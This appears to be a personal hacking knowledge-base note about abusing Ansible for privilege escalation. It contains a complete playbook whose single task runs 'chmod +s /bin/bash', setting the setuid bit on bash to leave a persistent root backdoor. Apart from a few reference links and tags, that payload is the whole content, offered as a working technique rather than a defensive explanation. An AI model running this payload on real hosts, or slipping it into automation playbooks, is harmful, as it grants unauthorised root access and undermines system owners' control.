# ansible exploiting playbook priv esc backdoor
```yaml
- name: "whatever"
  hosts: localhost
  connection: local
  tasks:
    - name: "whatever"
      shell: "chmod +s /bin/bash"
      register: "output"
```

# References
- [20221003150338](/zet/20221003150338/README.md) ansible exploiting playbook
- ~/kb/hacking/misc/ansible.md

Tags:
    #assorted #hacking #ansible
